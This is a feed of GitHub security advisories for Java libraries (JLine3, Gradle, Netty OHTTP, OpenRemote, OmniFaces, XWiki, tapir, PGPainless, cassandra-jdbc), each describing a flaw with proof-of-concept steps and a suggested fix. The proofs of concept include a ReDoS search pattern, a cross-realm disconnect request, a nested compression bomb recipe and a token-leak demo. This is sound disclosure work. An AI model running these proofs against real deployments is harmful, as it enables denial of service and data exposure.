title: Security Advisory for Java artifacts hosted at the Maven central repository
description: Security Advisory for Java artifacts hosted at the Maven central repository on GitHub

items.content_html:
Summary

The JLine3 built-in less pager compiles user-supplied search patterns directly as Java regular expressions with no sanitization, timeout, or backtracking bound. A malicious pattern such as (a+)+b can trigger catastrophic backtracking and hang the session thread at 100% CPU. In deployments that expose less over Telnet or SSH, this becomes a denial-of-service issue for the affected session and can be used to exhaust a bounded session pool.

Details

Less.getPattern() in builtins/src/main/java/org/jline/builtins/Less.java compiles the user-controlled search string directly with Pattern.compile():

private Pattern getPattern(boolean doDisplayPattern) {
    Pattern compiled = null;
    String _pattern = doDisplayPattern ? displayPattern : pattern;
    if (_pattern != null) {
        boolean insensitive =
                ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
        compiled = Pattern.compile(
                "(" + _pattern + ")", insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
    }
    return compiled;
}

The resulting pattern is then applied repeatedly against file content with compiled.matcher(line).find() in the less search path. Because Java's java.util.regex engine is backtracking-based and has no built-in timeout, patterns with nested quantifiers can take exponential time on non-matching input.

Affected source locations:

  • builtins/src/main/java/org/jline/builtins/Less.java
  • getPattern(boolean doDisplayPattern)
  • search callers using compiled.matcher(line).find()

PoC

  1. Create a file with a long run of a characters:
printf 'aaaaaaaaaaaaaaaaaaaaaaaaa\n' > /tmp/testfile.txt
  1. Open the file with the JLine3 less viewer.
  2. Press / to enter search mode.
  3. Enter the pattern (a+)+b and press Enter.

Expected result:

  • The less session stops responding.
  • The session thread consumes high CPU.

Variation:

  • The same behavior can be triggered through the display-filter path using & because that path also compiles user input as a raw Java regex.

Reproduction environment:

  • JLine3 on x86_64 Linux
  • OpenJDK 25.0.2

Impact

This is a denial-of-service vulnerability caused by catastrophic regex backtracking. Any application embedding org.jline:jline-builtins and exposing the less viewer is impacted. In local use, the affected user can hang their own session. In multi-user Telnet or SSH deployments, one attacker can occupy one session thread indefinitely and multiple attackers or sessions can exhaust the server's available worker pool.

Suggested Fix

The preferred fix for the current git head is to move user-controlled regex matching to a linear-time engine such as RE2/J.

Suggested patch:

diff --git a/builtins/pom.xml b/builtins/pom.xml
--- a/builtins/pom.xml
+++ b/builtins/pom.xml
@@
         <dependency>
+            <groupId>com.google.re2j</groupId>
+            <artifactId>re2j</artifactId>
+            <version>1.8</version>
+        </dependency>
+        <dependency>
             <groupId>org.jline</groupId>
             <artifactId>jline-reader</artifactId>
         </dependency>

diff --git a/builtins/src/main/java/org/jline/builtins/Less.java b/builtins/src/main/java/org/jline/builtins/Less.java
--- a/builtins/src/main/java/org/jline/builtins/Less.java
+++ b/builtins/src/main/java/org/jline/builtins/Less.java
@@
-import java.util.regex.Pattern;
+import com.google.re2j.Pattern;
@@
         if (_pattern != null) {
             boolean insensitive =
                     ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
             compiled = Pattern.compile(
                     "(" + _pattern + ")",
                     insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
         }

If introducing RE2/J is not acceptable, a weaker fallback is to perform regex matching in a worker with a strict timeout and reject patterns that exceed the time budget.

Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

References

  • https://github.com/jline/jline3/security/advisories/GHSA-2v9w-34q6-wpqx
  • https://nvd.nist.gov/vuln/detail/CVE-2026-77423
  • https://github.com/jline/jline3/pull/2012
  • https://github.com/jline/jline3/pull/2018

  • https://github.com/jline/jline3/commit/341ee69ccc57b7733c1b40d6993219b64b3206ae

items.content_html:
Impact

When resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning.

In previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository.

Vulnerability caused by continuing after max retries on transient errors

An exception like NoHttpResponseException can indicate transient errors. If the errors persist after a maximum number of retries, Gradle would continue to the next repository.

This behavior could allow an attacker to disrupt the service of a repository and leverage another repository to serve malicious artifacts. This attack requires the attacker to have control over a repository after the disrupted repository.

Patches

Gradle has introduced a change in behavior in Gradle 9.3.0 and 8.14.4 to stop searching other repositories when encountering these errors.

Upgrading to either version will protect you against the vulnerabilities described here.

Workarounds

If you are using strict repository content filtering and / or dependency verification, your build is safe from the potential vulnerabilities described above.

If you cannot update to a newer Gradle version, configuring dependency verification is the best way to make sure your build resolves the dependencies you expect and nothing else.

You should also review which repositories your builds use to check for unused or outdated repository declarations.

Related

  • Security feature of failing fast on bad repos does not seem to be implemented
  • Repository disabling
  • Advisory about repositories with unknown host

Summary:

OHttpClientCodec and OHttpServerCodec retain the encrypted outer HttpContent in a handler-level cumulationBuffer. After a valid OHTTP exchange completes, the OHTTP request/response context is destroyed, but the outer cumulationBuffer is not released or reset. It remains referenced by the codec until a later inbound content frame replaces it or the handler is removed/channel is closed.

This can pin attacker-influenced pooled/direct buffer capacity on idle keep-alive channels. Across many long-lived idle connections, this can create availability pressure.

Affected components:

  • codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpClientCodec.java
  • codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpServerCodec.java
  • codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpRequestResponseContext.java

Root cause:

OHttpClientCodec retains inbound content into a handler-level cumulationBuffer. On LastHttpContent, it destroys only the OHttpRequestResponseContextHolder. The cumulationBuffer is released in handlerRemoved(), not immediately after successful exchange completion.

OHttpServerCodec follows the same pattern: it retains inbound content into a handler-level cumulationBuffer, and on completed request/response it destroys the OHttpRequestResponseContext. The outer cumulationBuffer remains owned by the codec and is released only when the handler is removed.

OHttpRequestResponseContext.parse() consumes bytes from the caller-provided outer cumulation buffer, but its destroy() path releases only the inner binary HTTP cumulation, not the codec-level outer cumulationBuffer.

PoC:

A local test only:

codec-ohttp/src/test/java/io/netty/incubator/codec/ohttp/OHttpCumulationBufferRetentionTest.java

The test reuses existing OHTTP test helpers and BouncyCastle crypto provider to perform valid completed OHTTP exchanges over EmbeddedChannel pairs. It sends both a small and a large request/response exchange, confirms completion, then reflects the private cumulationBuffer field from both OHttpClientCodec and OHttpServerCodec.

Command:

./mvnw -pl codec-ohttp -Dtest=OHttpCumulationBufferRetentionTest -DfailIfNoTests=false test

Observed output:

small client after completion: refCnt=1 capacity=1064 readerIndex=1064 writerIndex=1064 readableBytes=0
small server after completion: refCnt=1 capacity=1110 readerIndex=1110 writerIndex=1110 readableBytes=0
large client after completion: refCnt=1 capacity=262144 readerIndex=131114 writerIndex=131114 readableBytes=0
large server after completion: refCnt=1 capacity=262144 readerIndex=131160 writerIndex=131160 readableBytes=0
small after close: clientOldRefCnt=0 serverOldRefCnt=0
large after close: clientOldRefCnt=0 serverOldRefCnt=0
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS

Interpretation:

After completion, both the client and server cumulationBuffer objects have:

  • refCnt=1
  • readableBytes=0
  • large retained capacity for the large exchange
  • channel still open/active
  • OHTTP context completed/destroyed

After channel close/handler removal, the previously retained buffers are released and their old refCnt values become 0.

Impact:

A peer can complete a large valid OHTTP request/response and keep the connection open. The codec retains the high-water outer cumulation buffer for the lifetime of the idle keep-alive channel, or until a later inbound content frame replaces it. Across many idle keep-alive channels, this can pin pooled/direct memory and create availability pressure.

This is not unbounded growth per exchange on a single channel. The more precise impact is connection-lifetime retention of the current consumed high-water outer cumulation buffer.

Suggested fix:

After successful LastHttpContent processing, release and reset the codec-level outer cumulationBuffer once parsing has consumed the complete message and no unread bytes remain.

Care is needed not to release the buffer if unread bytes remain for pipelined data. A safe fix would release/reset the outer cumulationBuffer in the completed-exchange path only when the parse consumed the full outer body.

Test environment:

  • WSL Ubuntu
  • Java 11
  • Current main branch / 0.0.24.Final-SNAPSHOT
  • PoC test used BouncyCastleOHttpCryptoProvider and existing OHttpCodecsTest helpers

Affected version testing:

The issue was reproduced on the following release tags:

  • netty-incubator-codec-parent-ohttp-0.0.20.Final
  • netty-incubator-codec-parent-ohttp-0.0.21.Final
  • netty-incubator-codec-parent-ohttp-0.0.22.Final
  • netty-incubator-codec-parent-ohttp-0.0.23.Final

It was also reproduced on main / 0.0.24.Final-SNAPSHOT.

For 0.0.20.Final through 0.0.23.Final, the PoC output consistently showed:

  • large client after completion: refCnt=1 capacity=262144 ... readableBytes=0
  • large server after completion: refCnt=1 capacity=262144 ... readableBytes=0
  • large after close: clientOldRefCnt=0 serverOldRefCnt=0
  • BUILD SUCCESS

This confirms that completed exchanges leave the consumed outer cumulation buffer retained until channel/handler close in these versions.

  • https://github.com/netty/netty-incubator-codec-ohttp/security/advisories/GHSA-cg26-4c6j-2x8h
  • https://nvd.nist.gov/vuln/detail/CVE-2026-69133
  • https://github.com/netty/netty-incubator-codec-ohttp/commit/a82cd85099c1a1fb78b73b068c77c8c902fc32ce

Summary

Cross-realm MQTT session disconnect without authorization

Vulnerability

The disconnectUserSession endpoint in UserResourceImpl.java (line 443) accepts a realm path parameter but ignores it entirely, performing no authorization or realm-boundary check before force-disconnecting an MQTT session. Any authenticated user from any realm can disconnect MQTT broker sessions belonging to users in other realms by supplying the target session ID.

File: manager/src/main/java/org/openremote/manager/security/UserResourceImpl.java, lines 443-447

@Override
public void disconnectUserSession(RequestParams requestParams, String realm, String sessionID) {
    if (!mqttBrokerService.disconnectSession(sessionID)) {
        throw new NotFoundException("User session not found");
    }
}

The REST interface at model/src/main/java/org/openremote/model/security/UserResource.java (line 201-204) maps this to GET {realm}/disconnect/{sessionID} with no @RolesAllowed annotation, so any authenticated user (not just admins) can call it.

Root Cause

CVE-2026-54641 (commit de89b8d) fixed cross-realm information disclosure in three read methods of the same file (get(), getUserClientRoles(), getUserRealmRoles()) and also added a realm check to getClientRoles(). The fix added throwIfCannotReadUserInRealm() and throwIfCannotAdminRealm() guards. However, disconnectUserSession was not patched and remains unprotected. Every other mutating method in this class has either a @RolesAllowed annotation on the interface or an explicit realm check in the implementation. This one has neither.

Proof of Concept

Given two realms, "master" and "building":

  1. User A authenticates in the "building" realm (any role, no admin needed).
  2. User B has an active MQTT session in the "master" realm with session ID S.
  3. User A sends: GET /api/master/user/master/disconnect/S with their building-realm bearer token.
  4. The handler ignores the realm path segments, looks up session S in the global connectionIDConnectionMap, and calls doForceDisconnect(). User B's MQTT connection is terminated.

Session IDs use the Netty ChannelId.asLongText() format (deterministic, partially sequential). While not trivially brute-forceable, IDs can leak through monitoring, logs, or correlated API calls. Within the same realm, any user (not just admins) can also disconnect sessions they should not have access to.

Impact

In a multi-tenant IoT deployment, an attacker authenticated in any realm can disrupt MQTT device connectivity in other realms. Since OpenRemote is used for building management, energy monitoring, and industrial IoT, forcibly disconnecting MQTT sessions can:

  • Knock IoT sensors and actuators offline across tenant boundaries
  • Disrupt safety-critical alarm monitoring (compounding the alarm IDOR fixed in CVE-2026-57168)
  • Cause denial of service against other tenants' device fleets

The method also uses HTTP GET for a destructive operation, making it susceptible to CSRF via image tags or link prefetch.

Suggested Fix

Add a realm administration check consistent with the pattern used elsewhere in this file:

@Override
public void disconnectUserSession(RequestParams requestParams, String realm, String sessionID) {
    throwIfCannotAdminRealm(realm);

    RemotingConnection connection = mqttBrokerService.getConnectionByID(sessionID);
    if (connection == null) {
        throw new NotFoundException("User session not found");
    }

    // Verify the session belongs to a user in the requested realm
    // before disconnecting

    if (!mqttBrokerService.disconnectSession(sessionID)) {
        throw new NotFoundException("User session not found");
    }
}

At minimum, add throwIfCannotAdminRealm(realm) as the first line, and consider adding a @RolesAllowed(Constants.WRITE_ADMIN_ROLE) annotation to the interface method. The HTTP method should also be changed from GET to DELETE.

Summary

GHSA-fp43-vj7g-pg92 (fixed 5.4.2) bound session- and view-scoped WebSocket (o:socket) push channels to the HTTP session that registered them, so a leaked channel ID can no longer be connected to from a foreign or absent HTTP session. The fix (d5cae243c4) touched only the Socket* classes.

The parallel SSE (o:sse, added in 5.2) push transport was left unchanged. SseEndpoint.doGet accepts a connection whenever the presented channel ID is in the application-wide registry, without ever checking that the caller's HTTP session owns it. A leaked session/view-scoped SSE channel ID can therefore be replayed from any (or no) HTTP session to receive the messages pushed to it — exactly the behaviour the advisory removed for WebSocket, still present on SSE at the latest release.

Root Cause

Both push transports share the same base classes. A session- or view-scoped channel ID is minted as channel + "?" + UUID.randomUUID() and registered only in an application-scoped, session-agnostic registry: PushChannelManager#L123 mints it and #L136 calls getPushSessions().register(channelId); the registry's membership test is PushSessionManager#L137-L139:

protected boolean isRegistered(String channelId) {
    return sessions.containsKey(channelId); // keyed by channelId only — no HTTP-session dimension
}

WebSocket (fixed). SocketChannelManager.register additionally records session/view channel IDs on the HTTP session, and the handshake refuses anything not owned by the caller's session, at SocketEndpoint.java#L133-L142:

if (
    !SocketChannelManager.isApplicationScopedChannelId(channelId)
        && !SocketChannelManager.isChannelIdRegisteredInSession((HttpSession) request.getHttpSession(), channelId)
) {
    throw new IllegalStateException(ERROR_UNAUTHORIZED_CHANNEL);
}

SSE (unfixed). SseChannelManager extends the base register() unchanged (no HTTP-session registration), and the endpoint's sole accept gate is the global isRegistered check, at SseEndpoint.java#L59-L66:

var channel = getChannel(request);
var channelId = channel + "?" + request.getQueryString();
var sseSessions = Beans.getReference(SseSessionManager.class);

if (channel == null || !sseSessions.isRegistered(channelId)) {
    response.getOutputStream().write(SSE_NOT_FOUND_EVENT);
    return;
}
// ...accepts: startAsync() and streams events for this channel

doGet never calls request.getSession(...); no Sse* class consults the HTTP session for the accept decision. So for a session/view-scoped channel ID the fix intends to bind, WebSocket refuses a foreign/absent session while SSE accepts it. (Application-scoped channels are unbound by design on both transports — not at issue here.)

Related, same root cause: the idle-timeout and max-sessions-per-channel bounds the fix added to SocketEndpoint / SocketSessionManager were also not ported to SSE — SseEndpoint.doGet sets asyncContext.setTimeout(0) and SseSessionManager inherits the unbounded getMaxSessionsPerChannel().

Steps to Reproduce

The PoC drives the real SseEndpoint.doGet from omnifaces 5.4.2 and shows it accepts a leaked session-scoped channel ID from a request carrying no owning HTTP session (and never consults the session), while the WebSocket fix refuses the same class of ID.

Prerequisites

  • JDK 21 or newer (tested on Temurin/Zulu 21 and OpenJDK 25)
  • Apache Maven 3.9+

Step 1: Create the project

mkdir -p /tmp/omnifaces-sse-poc/src/test/java/org/omnifaces/cdi/push
cd /tmp/omnifaces-sse-poc
cat > pom.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>

         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>poc</groupId>
    <artifactId>omnifaces-sse-poc</artifactId>
    <version>1.0</version>
    <packaging>jar</packaging>
    <properties>
        <maven.compiler.release>21</maven.compiler.release>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <build>
        <plugins>

                <groupId>org.apache.maven.plugins</groupId>

                <version>3.5.1</version>

        </plugins>
    </build>
</project>
EOF

Step 2: Add the test

cd /tmp/omnifaces-sse-poc
cat > src/test/java/org/omnifaces/cdi/push/SseChannelBindingPoCTest.java <<'EOF'
package org.omnifaces.cdi.push;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyBoolean;
import static org.mockito.Mockito.RETURNS_DEEP_STUBS;
import static org.mockito.Mockito.atLeastOnce;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.mockStatic;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.lang.reflect.Field;
import java.util.UUID;

import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;
import org.omnifaces.util.Beans;

import jakarta.servlet.AsyncContext;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

// Placed in package org.omnifaces.cdi.push to reach the protected/package-private push internals.
class SseChannelBindingPoCTest {

    // Drives the REAL SseEndpoint.doGet from omnifaces 5.4.2 (the advisory-patched release).
    // A session-scoped SSE channel id that leaked is accepted from a request that carries no
    // owning HTTP session, and the endpoint never even calls getSession().
    @Test
    void sse_endpoint_accepts_leaked_channel_from_a_request_with_no_session() throws Exception {
        SseSessionManager registry = new SseSessionManager();          // the @ApplicationScoped global registry
        setField(registry, "sseUsers", mock(SseUserManager.class));    // consulted by add(); return null user

        String channel = "clock";
        String uuid = UUID.randomUUID().toString();
        String leakedChannelId = channel + "?" + uuid;                 // session-scoped id = channel + "?" + UUID
        registry.register(leakedChannelId);                            // victim's page registered it at push time

        HttpServletRequest request = mock(HttpServletRequest.class, RETURNS_DEEP_STUBS);
        when(request.getPathInfo()).thenReturn("/" + channel);
        when(request.getQueryString()).thenReturn(uuid);
        AsyncContext asyncContext = mock(AsyncContext.class);
        when(request.startAsync()).thenReturn(asyncContext);
        HttpServletResponse response = mock(HttpServletResponse.class, RETURNS_DEEP_STUBS);

        try (MockedStatic<Beans> beans = mockStatic(Beans.class)) {
            beans.when(() -> Beans.getReference(SseSessionManager.class)).thenReturn(registry);

            new SseEndpoint().doGet(request, response);                // the real endpoint

            verify(request).startAsync();                              // accept branch: event stream opened
            assertTrue(registry.isRegistered(leakedChannelId));        // attacker connection registered under victim's id
            verify(request, never()).getSession();                     // endpoint NEVER consults the HTTP session
            verify(request, never()).getSession(anyBoolean());
            verify(response, never()).getOutputStream();               // 404 reject branch NOT taken
            beans.verify(() -> Beans.getReference(SseSessionManager.class), atLeastOnce());
        }
    }

    // The differential: GHSA-fp43-vj7g-pg92 added exactly this binding to the WebSocket transport.
    // For the same class of leaked session-scoped id, a caller with no owning HTTP session is refused.
    @Test
    void websocket_fix_binds_the_same_class_of_id_to_the_http_session() {
        String leakedSessionScopedChannelId = "clock?" + UUID.randomUUID();
        assertFalse(SocketChannelManager.isChannelIdRegisteredInSession(null, leakedSessionScopedChannelId));
        assertFalse(SocketChannelManager.isApplicationScopedChannelId(leakedSessionScopedChannelId));
    }

    private static void setField(Object target, String name, Object value) throws Exception {
        Field field = SseSessionManager.class.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }
}
EOF

Step 3: Run

cd /tmp/omnifaces-sse-poc
mvn -B test -DargLine="-Dnet.bytebuddy.experimental=true"

The net.bytebuddy.experimental flag lets Mockito's inline mock maker run on JDK 25; it is harmless on JDK 21-24.

Expected output:

[INFO]  T E S T S
[INFO] Running org.omnifaces.cdi.push.SseChannelBindingPoCTest
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0
[INFO] BUILD SUCCESS

sse_endpoint_accepts_leaked_channel_from_a_request_with_no_session passing means the real SseEndpoint.doGet opened the event stream for the leaked channel ID (startAsync called, connection registered, no 404 written) without ever calling getSession(). websocket_fix_binds_the_same_class_of_id_to_the_http_session passing shows the WebSocket fix refuses that same class of ID for a caller with no owning session.

Suggested Fix

Port the WebSocket session binding to SSE: register session/view scoped channel IDs on the HTTP session (as SocketChannelManager.registerChannelIdInSession does) and, in SseEndpoint.doGet, refuse the connection unless the channel is application-scoped or isChannelIdRegisteredInSession(request.getSession(false), channelId). Also port the idle-timeout and max-sessions-per-channel bounds to SseEndpoint / SseSessionManager. (Advisory only.)

Cleanup

rm -rf /tmp/omnifaces-sse-poc

Impact

An application that uses <o:sse> / @Push(type=SSE) with scope="session", scope="view", or a user attribute pushes messages intended for one session/user. The channel ID (channel + "?" + UUID) is a per-session/view secret carried in the SSE request URL, so it is exposed anywhere such URLs are logged: proxy and server access logs (CWE-598), APM / error reports, Referer headers, or a shared/copied link. An attacker who obtains a victim's channel ID can, from a different browser or with no session at all, connect to the SSE endpoint and receive every message the application pushes to that channel — data the scope exists to keep private to the victim. This is the same replay the maintainer fixed for the WebSocket transport in GHSA-fp43-vj7g-pg92 (issue: session/view channels connectable from a foreign or absent HTTP session), still reachable on SSE at 5.4.2. The concrete confidentiality depends on what the application pushes to the scope; the attacker only receives (no message injection). It requires prior exposure of the channel ID, matching the advisory's own threat model for the WebSocket case.

Impact

The query REST API allows executing HQL queries to filter the listed pages. While this properly checks access rights for the current user, the query can be used to combine when clauses and blind queries, to recover values, through FROM clause injection to join BaseObject and StringProperty tables, bypassing the HQL validator's SELECT column whitelist. This allows recovering any data that is stored in the database, including data from inaccessible pages, password hashes and passwords stored in configuration properties. For a typical password hash, this requires about 800 requests to the REST API (about one per bit). It should be assumed that when using more complex techniques, this even works when the attacker cannot read any wiki page. Password hashes use salted SHA1 in XWiki which can be cracked offline for weak passwords. Further, the executed database queries could be slow, affecting the availability of the system.

Patches

The vulnerability has been fixed in XWiki 16.10.18, 17.10.5 and 18.2.0 by disabling the HQL and WXQL queries in the REST API by default.

Workarounds

The requests to the /rest/wikis/{wikiName}/query endpoint could be blocked at the web server/reverse proxy level.

The OpenAPI code generator (tapir-openapi-codegen-core) builds Scala source by string templating and emitted several names/values from the (untrusted) OpenAPI document without escaping or validation, allowing injection of arbitrary Scala that runs at generated-code compile time and/or endpoint-assembly time (build/codegen-time RCE from an attacker-controlled spec).

This advisory covers the full class of sinks, all sharing one root cause and one fix (PR #5395, commit e015939b7): object property names (-> case-class fields), query/header/path parameter names (-> endpoint input DSL), and operation tags (-> .tags(List(...))). The fix routes identifier-position names through validation/quoting and string-literal values through JavaEscape.escapeString.

Consolidates the separately-reported query-param (GHSA-h3vr-jggp-jw5v), header-param (GHSA-3pjr-m3pf-r66v) and tag (GHSA-jc99-w66r-pcx5) sinks, which are the same issue.

items.content_html:
Summary

An architectural security boundary bypass in inline-detach and MessageInspector allows remote, unauthenticated attackers to force unbounded recursive decompression routines. By supplying a specially crafted OpenPGP message containing deeply nested compressed packet structures, an attacker can completely bypass the library's built-in DoS protections (MAX_LAYER_DEPTH = 16), leading to resource exhaustion, thread blocking, and potential Out-of-Memory (OOM) application crashes.

Details

The pg-painless core processing pipeline implements a defensive threshold constraint to prevent decompression bomb sequences (Zip Bombs) and arbitrary resource consumption:

Enforcement Location: pgpainless-main/pgpainless-core/src/main/kotlin/org/pgpainless/decryption_verification/MessageMetadata.kt

Threshold Constant: MAX_LAYER_DEPTH = 16

However, a code architecture review revealed two specific packet-walking implementations that unpack and step through PGPCompressedData packets manually, entirely failing to track or increment a layer depth index counter against the static compliance limits:

In InlineDetachImpl.kt (Line ~78-93): The logic loops over data packets via compressedData.dataStream. Because it processes the incoming data block-by-block without leveraging or passing constraints down to the guarded OpenPgpMessageInputStream tracking mechanism, it accepts infinite nesting.

In MessageInspector.kt (Line ~95): The inspector utility descends recursively down nested compressed packet layouts to ascertain inner content classification markers (e.g., determining encryption states) without referencing or respecting maximum layer depth boundaries.

PoC

The vulnerability can be verified by constructing an inline-signed binary message wrapped recursively inside multiple layers of compression packets:

Generate a standard, valid OpenPGP public/private keypair.

Sign a plaintext document sample utilizing binary inline-signing configurations (.noArmor()).

Programmatically loop 64 times over the output payload. In each iteration, encapsulate the previous binary output into a new PGPCompressedDataGenerator context configured with CompressionAlgorithmTags.ZIP.

Pass the final 64-layer nested byte array stream directly to the SOP interface via sop.inlineDetach().message(nestedBytes).toByteArrayAndResult().

Observed Result: The library completely parses the highly nested structures, returning a successful outcome without raising any execution constraints. The code fails to throw the expected SOPGPException.BadData, proving that the 16-layer boundary constraint was completely bypassed during the streaming packet loop.

Impact

Who is impacted: Any downstream application, gateway, or mail client (such as FlowCrypt or any framework integrating the library's SOP wrapper interface/MessageInspector modules) that handles untrusted, incoming external user files or signed attachment streams. An attacker can use this behavior to systematically freeze application threads, exhaust target heap allocation metrics, and disrupt backend infrastructure services.

The pg-painless core processing pipeline implements a defensive threshold constraint to prevent decompression bomb sequences (Zip Bombs) and arbitrary resource consumption:

Enforcement Location: pgpainless-main/pgpainless-core/src/main/kotlin/org/pgpainless/decryption_verification/MessageMetadata.kt

Threshold Constant: MAX_LAYER_DEPTH = 16

However, a code architecture review revealed two specific packet-walking implementations that unpack and step through PGPCompressedData packets manually, entirely failing to track or increment a layer depth index counter against the static compliance limits:

In InlineDetachImpl.kt (Line ~78-93): The logic loops over data packets via compressedData.dataStream. Because it processes the incoming data block-by-block without leveraging or passing constraints down to the guarded OpenPgpMessageInputStream tracking mechanism, it accepts infinite nesting.

In MessageInspector.kt (Line ~95): The inspector utility descends recursively down nested compressed packet layouts to ascertain inner content classification markers (e.g., determining encryption states) without referencing or respecting maximum layer depth boundaries.

The vulnerability can be verified by constructing an inline-signed binary message wrapped recursively inside multiple layers of compression packets:

Generate a standard, valid OpenPGP public/private keypair.

Sign a plaintext document sample utilizing binary inline-signing configurations (.noArmor()).

Programmatically loop 64 times over the output payload. In each iteration, encapsulate the previous binary output into a new PGPCompressedDataGenerator context configured with CompressionAlgorithmTags.ZIP.

Pass the final 64-layer nested byte array stream directly to the SOP interface via sop.inlineDetach().message(nestedBytes).toByteArrayAndResult().

Observed Result: The library completely parses the highly nested structures, returning a successful outcome without raising any execution constraints. The code fails to throw the expected SOPGPException.BadData, proving that the 16-layer boundary constraint was completely bypassed during the streaming packet loop.

Impact

Who is impacted: Any downstream application, gateway, or mail client (such as FlowCrypt or any framework integrating the library's SOP wrapper interface/MessageInspector modules) that handles untrusted, incoming external user files or signed attachment streams. An attacker can use this behavior to systematically freeze application threads, exhaust target heap allocation metrics, and disrupt backend infrastructure services.

Summary

The fix for AIKIDO-2024-10565 (plaintext password logging) introduced two redaction helpers — DriverUtil.toStringWithoutSensitiveValues() and DriverUtil.redactSensitiveValuesInJdbcUrl() — but both helpers only redact the "password" property/parameter (JdbcUrlUtil.TAG_PASSWORD). The equally sensitive "token" property (JdbcUrlUtil.TAG_TOKEN), used for DataStax Astra and other token-based Cassandra authentication, is completely unredacted by both helpers. Applications using token-based authentication with DEBUG logging enabled will therefore log the live authentication token in plaintext via SessionHolder's calls to these same two helpers — the exact same exposure pattern that the original fix was intended to prevent.

Details

File: src/main/java/com/ing/data/cassandra/jdbc/utils/DriverUtil.java

// toStringWithoutSensitiveValues (lines 341-347) -- only redacts "password"
public static String toStringWithoutSensitiveValues(final Properties properties) {
    final Properties withRedactedSensitiveValues = (Properties) properties.clone();
    if (withRedactedSensitiveValues.containsKey(TAG_PASSWORD)) {
        withRedactedSensitiveValues.setProperty(TAG_PASSWORD, "***");
    }
    return withRedactedSensitiveValues.toString();
}

// redactSensitiveValuesInJdbcUrl (lines 355-378) -- only redacts "password"
final String redactedQuery = Arrays.stream(...)
    .map(param -> {
        if (param.startsWith(TAG_PASSWORD + "=")) {
            return TAG_PASSWORD + "=***";
        }
        return param;     // <-- "token=..." passes through unmodified
    })
    ...

JdbcUrlUtil.java defines TAG_TOKEN = "token" (line 407) as a separate, distinct connection property used when connecting with DataStax Astra-style token-based authentication. Neither redaction helper checks for this key.

File: src/main/java/com/ing/data/cassandra/jdbc/SessionHolder.java

Both helpers are called on connection-level properties at DEBUG log level:

// Line 150 — logs all connection properties including "token" unredacted
log.debug("Final Properties to Connection: {}",
    toStringWithoutSensitiveValues(this.properties));

// Lines 173, 190 — logs JDBC URL including "?token=..." unredacted
final String jdbcUrl = redactSensitiveValuesInJdbcUrl(this.cacheKey.get(URL_KEY));
log.debug("Released last reference to {}, closing Session.", jdbcUrl);
log.debug("Acquired reference to {}, new count = {}.", jdbcUrl, ref + 1);

DEBUG logging is commonly enabled in production troubleshooting and staging environments, meaning the token is logged in plain text every time a connection is acquired or released in such environments.

PoC

Environment: JDK 17+, Maven 3.x

pom.xml dependency:

<dependency>
    <groupId>com.ing.data</groupId>
    <artifactId>cassandra-jdbc-wrapper</artifactId>
    <version>5.0.1</version>
</dependency>

import com.ing.data.cassandra.jdbc.utils.DriverUtil;
import java.util.Properties;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String secretToken = "AstraCS:SUPER_SECRET_TOKEN_VALUE_1234567890";

        // Test 1: redactSensitiveValuesInJdbcUrl()
        String urlWithToken = "jdbc:cassandra://host:9042/ks?token=" + secretToken;
        String redacted = DriverUtil.redactSensitiveValuesInJdbcUrl(urlWithToken);
        System.out.println("Token in 'redacted' URL: " + redacted.contains(secretToken)); // true

        // Test 2: toStringWithoutSensitiveValues()
        Properties props = new Properties();
        props.setProperty("token", secretToken);
        String redactedProps = DriverUtil.toStringWithoutSensitiveValues(props);
        System.out.println("Token in 'redacted' props: " + redactedProps.contains(secretToken)); // true

        // Control: password IS correctly redacted
        Properties propsWithPassword = new Properties();
        propsWithPassword.setProperty("password", "secret");
        System.out.println("Password redacted: " +
            !DriverUtil.toStringWithoutSensitiveValues(propsWithPassword).contains("secret")); // true
    }

Token in 'redacted' URL:   true   <- token leaks through the URL redactor
Token in 'redacted' props: true   <- token leaks through the property redactor
Password redacted:         true   <- password IS correctly masked (control)

The "redacted" output for a token-based connection string is byte-for-byte identical to the unredacted original — the helpers have no effect on token.

Vulnerability type: Insertion of Sensitive Information into Log File (CWE-532).

An authentication token (functionally equivalent in sensitivity to a password — it grants full access to the Cassandra cluster) is written in plaintext to application log files whenever:

  • The application uses token-based authentication (e.g., DataStax Astra), AND
  • DEBUG logging is enabled (common in staging environments and during production troubleshooting sessions).

An attacker who can read log files — via log aggregation system access, misconfigured log storage, or a separate log-reading vulnerability — can extract a live authentication token and use it to authenticate directly to the Cassandra cluster, accessing all data the token is authorized to read or write.

This is exactly the same impact class as the original AIKIDO-2024-10565 fix was intended to prevent — the fix simply missed a second sensitive credential type that was already present in the codebase.

Impact

